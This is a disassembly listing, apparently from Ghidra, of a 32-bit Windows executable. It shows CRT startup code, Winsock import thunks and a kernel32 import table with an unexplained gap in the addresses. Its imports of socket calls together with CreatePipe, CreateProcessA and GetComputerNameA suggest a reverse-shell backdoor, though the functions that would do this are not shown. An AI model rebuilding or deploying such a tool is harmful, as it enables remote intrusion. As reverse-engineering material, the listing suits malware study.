             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     00401d02(W)
             undefined4        Stack[-0x1c]:4 local_1c                                XREF[1]:     00401cfd(W)
             undefined2        Stack[-0x30]:2 local_30                                XREF[1]:     00401dea(R)
             undefined4        Stack[-0x34]:4 local_34                                XREF[2]:     00401dd7(W),
                                                                                                   00401de4(R)
             undefined1        Stack[-0x60]:1 local_60                                XREF[1]:     00401dda(*)
             undefined1        Stack[-0x64]:1 local_64                                XREF[1]:     00401d8b(*)
             undefined1        Stack[-0x68]:1 local_68                                XREF[1]:     00401d83(*)
             undefined4        Stack[-0x6c]:4 local_6c                                XREF[1]:     00401e0e(W)
             undefined4        Stack[-0x70]:4 local_70                                XREF[2]:     00401d76(W),
                                                                                                   00401d79(*)
             undefined1        Stack[-0x74]:1 local_74                                XREF[1]:     00401d87(*)
             undefined4        Stack[-0x78]:4 local_78                                XREF[4]:     00401dae(W),
                                                                                                   00401db7(W),
                                                                                                   00401dca(W),
                                                                                                   00401df6(W)
                             entry                                           XREF[2]:     Entry Point(*), 00400108(*)
        00401cda 55              PUSH       EBP
        00401cdb 8b ec           MOV        EBP,ESP
        00401cdd 6a ff           PUSH       -0x1
        00401cdf 68 50 21        PUSH       DAT_00402150                                     = FFh
                 40 00
        00401ce4 68 60 1e        PUSH       DAT_00401e60                                     = FFh
                 40 00
        00401ce9 64 a1 00        MOV        EAX,FS:[0x0]=>ExceptionList                      = 00000000
                 00 00 00
        00401cef 50              PUSH       EAX
        00401cf0 64 89 25        MOV        dword ptr FS:[0x0]=>ExceptionList,ESP            = 00000000
                 00 00 00 00
        00401cf7 83 ec 68        SUB        ESP,0x68
        00401cfa 53              PUSH       EBX
        00401cfb 56              PUSH       ESI
        00401cfc 57              PUSH       EDI
        00401cfd 89 65 e8        MOV        dword ptr [EBP + local_1c],ESP
        00401d00 33 db           XOR        EBX,EBX
        00401d02 89 5d fc        MOV        dword ptr [EBP + local_8],EBX
        00401d05 6a 02           PUSH       0x2                                              int param_1 for __set_app_type
        00401d07 ff 15 c4        CALL       dword ptr [->MSVCRT.DLL::__set_app_type]         = 00002604
                 20 40 00
        00401d0d 59              POP        ECX
        00401d0e 83 0d 1c        OR         dword ptr [DAT_0040361c],0xffffffff
                 36 40 00 ff
        00401d15 83 0d 20        OR         dword ptr [DAT_00403620],0xffffffff
                 36 40 00 ff
        00401d1c ff 15 c0        CALL       dword ptr [->MSVCRT.DLL::__p__fmode]             = 000025f6
                 20 40 00
        00401d22 8b 0d 18        MOV        ECX,dword ptr [DAT_00403618]
                 36 40 00
        00401d28 89 08           MOV        dword ptr [EAX],ECX
        00401d2a ff 15 bc        CALL       dword ptr [->MSVCRT.DLL::__p__commode]           = 000025e6
                 20 40 00
        00401d30 8b 0d 14        MOV        ECX,dword ptr [DAT_00403614]
                 36 40 00
        00401d36 89 08           MOV        dword ptr [EAX],ECX
        00401d38 a1 b8 20        MOV        EAX,[->MSVCRT.DLL::_adjust_fdiv]                 = 000025d6
                 40 00
        00401d3d 8b 00           MOV        EAX,dword ptr [EAX]
        00401d3f a3 24 36        MOV        [DAT_00403624],EAX
                 40 00
        00401d44 e8 10 01        CALL       FUN_00401e59                                     undefined FUN_00401e59(void)
                 00 00
        00401d49 39 1d 98        CMP        dword ptr [DAT_00403098],EBX                     = 00000001h
                 30 40 00
        00401d4f 75 0c           JNZ        LAB_00401d5d
        00401d51 68 56 1e        PUSH       LAB_00401e56
                 40 00
        00401d56 ff 15 b4        CALL       dword ptr [->MSVCRT.DLL::__setusermatherr]       = 000025c2
                 20 40 00
        00401d5c 59              POP        ECX
                             LAB_00401d5d                                    XREF[1]:     00401d4f(j)
        00401d5d e8 e2 00        CALL       FUN_00401e44                                     undefined FUN_00401e44(void)
                 00 00
        00401d62 68 0c 30        PUSH       DAT_0040300c
                 40 00
        00401d67 68 08 30        PUSH       DAT_00403008
                 40 00
        00401d6c e8 cd 00        CALL       MSVCRT.DLL::initterm                             undefined initterm()
                 00 00
        00401d71 a1 10 36        MOV        EAX,[DAT_00403610]
                 40 00
        00401d76 89 45 94        MOV        dword ptr [EBP + local_70],EAX
        00401d79 8d 45 94        LEA        EAX=>local_70,[EBP + -0x6c]
        00401d7c 50              PUSH       EAX                                              _startupinfo * _StartInfo for __
        00401d7d ff 35 0c        PUSH       dword ptr [_DoWildCard_0040360c]                 int _DoWildCard for __getmainargs
                 36 40 00
        00401d83 8d 45 9c        LEA        EAX=>local_68,[EBP + -0x64]
        00401d86 50              PUSH       EAX                                              char * * * _Env for __getmainargs
        00401d87 8d 45 90        LEA        EAX=>local_74,[EBP + -0x70]
        00401d8a 50              PUSH       EAX                                              char * * * _Argv for __getmainargs
        00401d8b 8d 45 a0        LEA        EAX=>local_64,[EBP + -0x60]
        00401d8e 50              PUSH       EAX                                              int * _Argc for __getmainargs
        00401d8f ff 15 ac        CALL       dword ptr [->MSVCRT.DLL::__getmainargs]          = 000025a6
                 20 40 00
        00401d95 68 04 30        PUSH       DAT_00403004
                 40 00
        00401d9a 68 00 30        PUSH       DAT_00403000
                 40 00
        00401d9f e8 9a 00        CALL       MSVCRT.DLL::initterm                             undefined initterm()
                 00 00
        00401da4 83 c4 24        ADD        ESP,0x24
        00401da7 a1 a8 20        MOV        EAX,[->MSVCRT.DLL::_acmdln]                      = 0000259c
                 40 00
        00401dac 8b 30           MOV        ESI,dword ptr [EAX]
        00401dae 89 75 8c        MOV        dword ptr [EBP + local_78],ESI
        00401db1 80 3e 22        CMP        byte ptr [ESI],0x22
        00401db4 75 3a           JNZ        LAB_00401df0
                             LAB_00401db6                                    XREF[1]:     00401dc2(j)
        00401db6 46              INC        ESI
        00401db7 89 75 8c        MOV        dword ptr [EBP + local_78],ESI
        00401dba 8a 06           MOV        AL,byte ptr [ESI]
        00401dbc 3a c3           CMP        AL,BL
        00401dbe 74 04           JZ         LAB_00401dc4
        00401dc0 3c 22           CMP        AL,0x22
        00401dc2 75 f2           JNZ        LAB_00401db6
                             LAB_00401dc4                                    XREF[1]:     00401dbe(j)
        00401dc4 80 3e 22        CMP        byte ptr [ESI],0x22
        00401dc7 75 04           JNZ        LAB_00401dcd
                             LAB_00401dc9                                    XREF[1]:     00401dd5(j)
        00401dc9 46              INC        ESI
        00401dca 89 75 8c        MOV        dword ptr [EBP + local_78],ESI
                             LAB_00401dcd                                    XREF[2]:     00401dc7(j), 00401df3(j)
        00401dcd 8a 06           MOV        AL,byte ptr [ESI]
        00401dcf 3a c3           CMP        AL,BL
        00401dd1 74 04           JZ         LAB_00401dd7
        00401dd3 3c 20           CMP        AL,0x20
        00401dd5 76 f2           JBE        LAB_00401dc9
                             LAB_00401dd7                                    XREF[1]:     00401dd1(j)
        00401dd7 89 5d d0        MOV        dword ptr [EBP + local_34],EBX
        00401dda 8d 45 a4        LEA        EAX=>local_60,[EBP + -0x5c]
        00401ddd 50              PUSH       EAX                                              LPSTARTUPINFOA lpStartupInfo for
        00401dde ff 15 70        CALL       dword ptr [->KERNEL32.DLL::GetStartupInfoA]      = 00002664
                 20 40 00
        00401de4 f6 45 d0 01     TEST       byte ptr [EBP + local_34],0x1
        00401de8 74 11           JZ         LAB_00401dfb
        00401dea 0f b7 45 d4     MOVZX      EAX,word ptr [EBP + local_30]
        00401dee eb 0e           JMP        LAB_00401dfe
                             LAB_00401df0                                    XREF[2]:     00401db4(j), 00401df9(j)
        00401df0 80 3e 20        CMP        byte ptr [ESI],0x20
        00401df3 76 d8           JBE        LAB_00401dcd
        00401df5 46              INC        ESI
        00401df6 89 75 8c        MOV        dword ptr [EBP + local_78],ESI
        00401df9 eb f5           JMP        LAB_00401df0
                             LAB_00401dfb                                    XREF[1]:     00401de8(j)
        00401dfb 6a 0a           PUSH       0xa
        00401dfd 58              POP        EAX
                             LAB_00401dfe                                    XREF[1]:     00401dee(j)
        00401dfe 50              PUSH       EAX
        00401dff 56              PUSH       ESI
        00401e00 53              PUSH       EBX
        00401e01 53              PUSH       EBX                                              LPCSTR lpModuleName for GetModul
        00401e02 ff 15 74        CALL       dword ptr [->KERNEL32.DLL::GetModuleHandleA]     = 00002650
                 20 40 00
        00401e08 50              PUSH       EAX
        00401e09 e8 32 f4        CALL       FUN_00401240                                     undefined4 FUN_00401240(HINSTANC
                 ff ff
        00401e0e 89 45 98        MOV        dword ptr [EBP + local_6c],EAX
        00401e11 50              PUSH       EAX                                              int _Code for exit
        00401e12 ff 15 a4        CALL       dword ptr [->MSVCRT.DLL::exit]                   = 00002594
                 20 40 00
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
             assume FS_OFFSET = <UNKNOWN>
                             LAB_00401e18                                    XREF[1]:     00402154(*)
        00401e18 8b 45 ec        MOV        EAX,dword ptr [EBP + -0x14]
        00401e1b 8b 08           MOV        ECX,dword ptr [EAX]
        00401e1d 8b 09           MOV        ECX,dword ptr [ECX]
        00401e1f 89 4d 88        MOV        dword ptr [EBP + -0x78],ECX
        00401e22 50              PUSH       EAX
        00401e23 51              PUSH       ECX
        00401e24 e8 0f 00        CALL       MSVCRT.DLL::_XcptFilter                          int _XcptFilter(ulong _Exception
                 00 00
        00401e29 59              POP        ECX
        00401e2a 59              POP        ECX
        00401e2b c3              RET
             assume FS_OFFSET = 0xffdff000
                             LAB_00401e2c                                    XREF[1]:     00402158(*)
        00401e2c 8b 65 e8        MOV        ESP,dword ptr [EBP + -0x18]
        00401e2f ff 75 88        PUSH       dword ptr [EBP + -0x78]
        00401e32 ff 15 9c        CALL       dword ptr [->MSVCRT.DLL::_exit]                  = 0000257e
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk int __cdecl _XcptFilter(ulong _ExceptionNum, _EXCE
                               Thunked-Function: MSVCRT.DLL::_XcptFilter
             int               EAX:4          <RETURN>
             ulong             Stack[0x4]:4   _ExceptionNum
             _EXCEPTION_POI    Stack[0x8]:4   _ExceptionPtr
                             MSVCRT.DLL::_XcptFilter                         XREF[1]:     00401e24(c)
        00401e38 ff 25 a0        JMP        dword ptr [->MSVCRT.DLL::_XcptFilter]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined __cdecl initterm()
                               Thunked-Function: MSVCRT.DLL::initterm
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             MSVCRT.DLL::initterm                            XREF[2]:     entry:00401d6c(c),
                                                                                          entry:00401d9f(c)
        00401e3e ff 25 b0        JMP        dword ptr [->MSVCRT.DLL::initterm]
                 20 40 00
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_00401e44(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             FUN_00401e44                                    XREF[1]:     entry:00401d5d(c)
        00401e44 68 00 00        PUSH       0x30000                                          uint _Mask for _controlfp
                 03 00
        00401e49 68 00 00        PUSH       0x10000                                          uint _NewValue for _controlfp
                 01 00
        00401e4e e8 13 00        CALL       MSVCRT.DLL::_controlfp                           uint _controlfp(uint _NewValue,
                 00 00
        00401e53 59              POP        ECX
        00401e54 59              POP        ECX
        00401e55 c3              RET
                             LAB_00401e56                                    XREF[1]:     entry:00401d51(*)
        00401e56 33 c0           XOR        EAX,EAX
        00401e58 c3              RET
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_00401e59(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             FUN_00401e59                                    XREF[1]:     entry:00401d44(c)
        00401e59 c3              RET
        00401e5a cc              ??         CCh
        00401e5b cc              ??         CCh
        00401e5c cc              ??         CCh
        00401e5d cc              ??         CCh
        00401e5e cc              ??         CCh
        00401e5f cc              ??         CCh
                             DAT_00401e60                                    XREF[1]:     entry:00401ce4(*)
        00401e60 ff              ??         FFh
        00401e61 25              ??         25h    %
        00401e62 c8              ??         C8h                                              ?  ->  004020c8
        00401e63 20              ??         20h
        00401e64 40              ??         40h    @
        00401e65 00              ??         00h
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk uint __cdecl _controlfp(uint _NewValue, uint _Mask)
                               Thunked-Function: MSVCRT.DLL::_controlfp
                               assume FS_OFFSET = 0xffdff000
             uint              EAX:4          <RETURN>
             uint              Stack[0x4]:4   _NewValue
             uint              Stack[0x8]:4   _Mask
                             MSVCRT.DLL::_controlfp                          XREF[1]:     FUN_00401e44:00401e4e(c)
        00401e66 ff 25 7c        JMP        dword ptr [->MSVCRT.DLL::_controlfp]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_19()
                               Thunked-Function: WS2_32.DLL::Ordinal_19
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_19                          XREF[1]:     FUN_00401320:00401507(c)
        00401e6c ff 25 f8        JMP        dword ptr [->WS2_32.DLL::Ordinal_19]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_16()
                               Thunked-Function: WS2_32.DLL::Ordinal_16
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_16                          XREF[2]:     FUN_00401320:00401564(c),
                                                                                          FUN_00401320:004015c6(c)
        00401e72 ff 25 00        JMP        dword ptr [->WS2_32.DLL::Ordinal_16]
                 21 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_4()
                               Thunked-Function: WS2_32.DLL::Ordinal_4
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_4                           XREF[1]:     FUN_00401320:00401466(c)
        00401e78 ff 25 ec        JMP        dword ptr [->WS2_32.DLL::Ordinal_4]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_11()
                               Thunked-Function: WS2_32.DLL::Ordinal_11
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_11                          XREF[1]:     FUN_00401320:00401455(c)
        00401e7e ff 25 fc        JMP        dword ptr [->WS2_32.DLL::Ordinal_11]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_9()
                               Thunked-Function: WS2_32.DLL::Ordinal_9
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_9                           XREF[1]:     FUN_00401320:00401446(c)
        00401e84 ff 25 e8        JMP        dword ptr [->WS2_32.DLL::Ordinal_9]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_3()
                               Thunked-Function: WS2_32.DLL::Ordinal_3
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_3                           XREF[3]:     FUN_00401320:00401411(c),
                                                                                          FUN_00401320:00401471(c),
                                                                                          _StartAddress_004016f0:00401801(
        00401e8a ff 25 04        JMP        dword ptr [->WS2_32.DLL::Ordinal_3]
                 21 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_23()
                               Thunked-Function: WS2_32.DLL::Ordinal_23
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_23                          XREF[1]:     FUN_00401320:00401404(c)
        00401e90 ff 25 f0        JMP        dword ptr [->WS2_32.DLL::Ordinal_23]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_115()
                               Thunked-Function: WS2_32.DLL::Ordinal_115
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_115                         XREF[1]:     FUN_00401320:004013fa(c)
        00401e96 ff 25 f4        JMP        dword ptr [->WS2_32.DLL::Ordinal_115]
                 20 40 00
        00401e9c cc              ??         CCh
        00401e9d cc              ??         CCh
        00401e9e cc              ??         CCh
        00401e9f cc              ??         CCh
        00401ea0 ff              ??         FFh
        00401ea1 25              ??         25h    %
        00401ea2 cc              ??         CCh                                              ?  ->  004020cc
        00401ea3 20              ??         20h
        00401ea4 40              ??         40h    @
   00401fe7 00              ??         00h
        00401fe8 00              ??         00h
        00401fe9 00              ??         00h
        00401fea 00              ??         00h
        00401feb 00              ??         00h
        00401fec 00              ??         00h
        00401fed 00              ??         00h
        00401fee 00              ??         00h
        00401fef 00              ??         00h
        00401ff0 00              ??         00h
        00401ff1 00              ??         00h
        00401ff2 00              ??         00h
        00401ff3 00              ??         00h
        00401ff4 00              ??         00h
        00401ff5 00              ??         00h
        00401ff6 00              ??         00h
        00401ff7 00              ??         00h
        00401ff8 00              ??         00h
        00401ff9 00              ??         00h
        00401ffa 00              ??         00h
        00401ffb 00              ??         00h
        00401ffc 00              ??         00h
        00401ffd 00              ??         00h
        00401ffe 00              ??         00h
        00401fff 00              ??         00h
                             //
                             // .rdata
                             // ram:00402000-ram:004027ff
                             //
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall CloseHandle(HANDLE hObject)
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hObject
             assume FS_OFFSET = <UNKNOWN>
                             46  CloseHandle  <<not bound>>
                             PTR_CloseHandle_00402000                        XREF[8]:     00400110(*), 004001b8(*),
                                                                                          0040020c(*),
                                                                                          FUN_004012c0:00401317(R),
                                                                                          FUN_00401600:00401677(R),
                                                                                          FUN_00401600:004016c4(R),
                                                                                          _StartAddress_004016f0:00401813(
                                                                                          FUN_00401860:00401923(R)
        00402000 e0 22 00 00     addr       KERNEL32.DLL::CloseHandle
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWOR
             DWORD             EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hHandle
             DWORD             Stack[0x8]:4   dwMilliseconds
                             901  WaitForSingleObject  <<not bound>>
                             PTR_WaitForSingleObject_00402004                XREF[1]:     FUN_004012c0:0040130a(R)
        00402004 ee 22 00 00     addr       KERNEL32.DLL::WaitForSingleObject
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEv
             HANDLE            EAX:4          <RETURN>
             LPSECURITY_ATT    Stack[0x4]:4   lpEventAttributes
             BOOL              Stack[0x8]:4   bManualReset
             BOOL              Stack[0xc]:4   bInitialState
             LPCSTR            Stack[0x10]:4  lpName
                             73  CreateEventA  <<not bound>>
                             PTR_CreateEventA_00402008                       XREF[1]:     FUN_004012c0:004012c1(R)
        00402008 04 23 00 00     addr       KERNEL32.DLL::CreateEventA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             noreturn void __stdcall ExitThread(DWORD dwExitCode)
             void              <VOID>         <RETURN>
             DWORD             Stack[0x4]:4   dwExitCode
                             176  ExitThread  <<not bound>>
                             PTR_ExitThread_0040200c                         XREF[1]:     FUN_00401320:004015f0(R)
        0040200c 14 23 00 00     addr       KERNEL32.DLL::ExitThread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __stdcall Sleep(DWORD dwMilliseconds)
             void              <VOID>         <RETURN>
             DWORD             Stack[0x4]:4   dwMilliseconds
                             841  Sleep  <<not bound>>
                             PTR_Sleep_00402010                              XREF[1]:     FUN_00401320:0040141b(R)
        00402010 22 23 00 00     addr       KERNEL32.DLL::Sleep
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall GetComputerNameA(LPSTR lpBuffer, LPDWORD
             BOOL              EAX:4          <RETURN>
             LPSTR             Stack[0x4]:4   lpBuffer
             LPDWORD           Stack[0x8]:4   nSize
                             268  GetComputerNameA  <<not bound>>
                             PTR_GetComputerNameA_00402014                   XREF[1]:     FUN_00401320:004013cf(R)
        00402014 2a 23 00 00     addr       KERNEL32.DLL::GetComputerNameA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall CreatePipe(PHANDLE hReadPipe, PHANDLE hWr
             BOOL              EAX:4          <RETURN>
             PHANDLE           Stack[0x4]:4   hReadPipe
             PHANDLE           Stack[0x8]:4   hWritePipe
             LPSECURITY_ATT    Stack[0xc]:4   lpPipeAttributes
             DWORD             Stack[0x10]:4  nSize
                             95  CreatePipe  <<not bound>>
                             PTR_CreatePipe_00402018                         XREF[1]:     FUN_00401600:0040161d(R)
        00402018 3e 23 00 00     addr       KERNEL32.DLL::CreatePipe
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall DisconnectNamedPipe(HANDLE hNamedPipe)
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hNamedPipe
                             133  DisconnectNamedPipe  <<not bound>>
                             PTR_DisconnectNamedPipe_0040201c                XREF[1]:     _StartAddress_004016f0:00401808(
        0040201c 4c 23 00 00     addr       KERNEL32.DLL::DisconnectNamedPipe
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uE
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hProcess
             UINT              Stack[0x8]:4   uExitCode
                             849  TerminateProcess  <<not bound>>
                             PTR_TerminateProcess_00402020                   XREF[1]:     _StartAddress_004016f0:004017f6(
        00402020 62 23 00 00     addr       KERNEL32.DLL::TerminateProcess
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall WaitForMultipleObjects(DWORD nCount, HAN
             DWORD             EAX:4          <RETURN>
             DWORD             Stack[0x4]:4   nCount
             HANDLE *          Stack[0x8]:4   lpHandles
             BOOL              Stack[0xc]:4   bWaitAll
             DWORD             Stack[0x10]:4  dwMilliseconds
                             899  WaitForMultipleObjects  <<not bound>>
                             PTR_WaitForMultipleObjects_00402024             XREF[1]:     _StartAddress_004016f0:004017a7(
        00402024 76 23 00 00     addr       KERNEL32.DLL::WaitForMultipleObjects
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwE
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hThread
             DWORD             Stack[0x8]:4   dwExitCode
                             850  TerminateThread  <<not bound>>
                             PTR_TerminateThread_00402028                    XREF[4]:     _StartAddress_004016f0:0040177b(
                                                                                          _StartAddress_004016f0:004017bb(
                                                                                          _StartAddress_004016f0:004017d6(
                                                                                          _StartAddress_004016f0:004017ea(
        00402028 90 23 00 00     addr       KERNEL32.DLL::TerminateThread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpTh
             HANDLE            EAX:4          <RETURN>
             LPSECURITY_ATT    Stack[0x4]:4   lpThreadAttributes
             SIZE_T            Stack[0x8]:4   dwStackSize
             LPTHREAD_START    Stack[0xc]:4   lpStartAddress
             LPVOID            Stack[0x10]:4  lpParameter
             DWORD             Stack[0x14]:4  dwCreationFlags
             LPDWORD           Stack[0x18]:4  lpThreadId
                             105  CreateThread  <<not bound>>
                             PTR_CreateThread_0040202c                       XREF[1]:     _StartAddress_004016f0:00401704(
        0040202c a2 23 00 00     addr       KERNEL32.DLL::CreateThread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName,
             BOOL              EAX:4          <RETURN>
             LPCSTR            Stack[0x4]:4   lpApplicationName
             LPSTR             Stack[0x8]:4   lpCommandLine
             LPSECURITY_ATT    Stack[0xc]:4   lpProcessAttributes
             LPSECURITY_ATT    Stack[0x10]:4  lpThreadAttributes
             BOOL              Stack[0x14]:4  bInheritHandles
             DWORD             Stack[0x18]:4  dwCreationFlags
             LPVOID            Stack[0x1c]:4  lpEnvironment
             LPCSTR            Stack[0x20]:4  lpCurrentDirectory
             LPSTARTUPINFOA    Stack[0x24]:4  lpStartupInfo
             LPPROCESS_INFO    Stack[0x28]:4  lpProcessInformation
                             96  CreateProcessA  <<not bound>>
                             PTR_CreateProcessA_00402030                     XREF[1]:     FUN_00401860:00401910(R)
        00402030 b2 23 00 00     addr       KERNEL32.DLL::CreateProcessA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall DuplicateHandle(HANDLE hSourceProcessHand
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hSourceProcessHandle
             HANDLE            Stack[0x8]:4   hSourceHandle
             HANDLE            Stack[0xc]:4   hTargetProcessHandle
             LPHANDLE          Stack[0x10]:4  lpTargetHandle
             DWORD             Stack[0x14]:4  dwDesiredAccess
             BOOL              Stack[0x18]:4  bInheritHandle
             DWORD             Stack[0x1c]:4  dwOptions
                             140  DuplicateHandle  <<not bound>>
                             PTR_DuplicateHandle_00402034                    XREF[1]:     FUN_00401860:004018cd(R)
        00402034 c4 23 00 00     addr       KERNEL32.DLL::DuplicateHandle
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HANDLE __stdcall GetCurrentProcess(void)
             HANDLE            EAX:4          <RETURN>
                             314  GetCurrentProcess  <<not bound>>
                             PTR_GetCurrentProcess_00402038                  XREF[2]:     FUN_00401860:00401870(R),
                                                                                          FUN_00401b50:00401c03(R)
        00402038 d6 23 00 00     addr       KERNEL32.DLL::GetCurrentProcess
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, D
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hFile
             LPVOID            Stack[0x8]:4   lpBuffer
             DWORD             Stack[0xc]:4   nNumberOfBytesToRead
             LPDWORD           Stack[0x10]:4  lpNumberOfBytesRead
             LPOVERLAPPED      Stack[0x14]:4  lpOverlapped
                             683  ReadFile  <<not bound>>
        0040203c ea 23 00 00     addr       KERNEL32.DLL::ReadFile
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall PeekNamedPipe(HANDLE hNamedPipe, LPVOID l
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hNamedPipe
             LPVOID            Stack[0x8]:4   lpBuffer
             DWORD             Stack[0xc]:4   nBufferSize
             LPDWORD           Stack[0x10]:4  lpBytesRead
             LPDWORD           Stack[0x14]:4  lpTotalBytesAvail
             LPDWORD           Stack[0x18]:4  lpBytesLeftThisMessage
                             647  PeekNamedPipe  <<not bound>>
        00402040 f6 23 00 00     addr       KERNEL32.DLL::PeekNamedPipe
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall SetEvent(HANDLE hEvent)
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hEvent
                             779  SetEvent  <<not bound>>
        00402044 06 24 00 00     addr       KERNEL32.DLL::SetEvent
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer,
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hFile
             LPCVOID           Stack[0x8]:4   lpBuffer
             DWORD             Stack[0xc]:4   nNumberOfBytesToWrite
             LPDWORD           Stack[0x10]:4  lpNumberOfBytesWritten
             LPOVERLAPPED      Stack[0x14]:4  lpOverlapped
                             919  WriteFile  <<not bound>>
        00402048 12 24 00 00     addr       KERNEL32.DLL::WriteFile
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall SetProcessPriorityBoost(HANDLE hProcess,
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hProcess
             BOOL              Stack[0x8]:4   bDisablePriorityBoost
                             808  SetProcessPriorityBoost  <<not bound>>
                             PTR_SetProcessPriorityBoost_0040204c            XREF[1]:     FUN_00401b50:00401c6b(R)
        0040204c 1e 24 00 00     addr       KERNEL32.DLL::SetProcessPriorityBoost
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall SetThreadPriority(HANDLE hThread, int nPr
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hThread
             int               Stack[0x8]:4   nPriority
                             824  SetThreadPriority  <<not bound>>
                             PTR_SetThreadPriority_00402050                  XREF[1]:     FUN_00401b50:00401c43(R)
        00402050 38 24 00 00     addr       KERNEL32.DLL::SetThreadPriority
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HANDLE __stdcall GetCurrentThread(void)
             HANDLE            EAX:4          <RETURN>
                             317  GetCurrentThread  <<not bound>>
                             PTR_GetCurrentThread_00402054                   XREF[1]:     FUN_00401b50:00401c39(R)
        00402054 4c 24 00 00     addr       KERNEL32.DLL::GetCurrentThread
                             **************************************************************
